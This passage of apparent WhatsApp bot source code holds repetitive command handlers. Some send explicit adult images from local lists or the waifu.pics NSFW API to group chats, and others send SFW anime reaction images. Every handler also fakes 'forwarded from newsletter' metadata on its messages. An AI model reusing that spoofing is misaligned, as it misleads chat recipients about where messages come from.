	if (!AntiNsfw) return replygcveran(mess.nsfw)
await VeranStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/cuckold.json'))
var veranyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:veranyresult.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'eba':{
if (!m.isGroup) return VeranStickGroup()
	if (!AntiNsfw) return replygcveran(mess.nsfw)
await VeranStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/eba.json'))
var veranyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:veranyresult.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'pussy':{
if (!m.isGroup) return VeranStickGroup()
	if (!AntiNsfw) return replygcveran(mess.nsfw)
await VeranStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/pussy.json'))
var veranyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:veranyresult.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'yuri':{
if (!m.isGroup) return VeranStickGroup()
	if (!AntiNsfw) return replygcveran(mess.nsfw)
await VeranStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/yuri.json'))
var veranyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:veranyresult.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'zettai':{
if (!m.isGroup) return VeranStickGroup()
	if (!AntiNsfw) return replygcveran(mess.nsfw)
await VeranStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/zettai.json'))
var veranyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:veranyresult.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'gifblowjob':{
if (!m.isGroup) return VeranStickGroup()
if (!AntiNsfw) return replygcveran(mess.nsfw)
await VeranStickWait()
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video:bogif, gifPlayback:true }, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
}
break
			case 'animeawoo':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
 let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animemegumin':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeshinobu':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehandhold':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehighfive':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecringe':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animedance':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehappy':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeglomp':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animesmug':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeblush':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewave':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animesmile':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animepoke':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animewink':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebonk':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animebully':{
await VeranStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
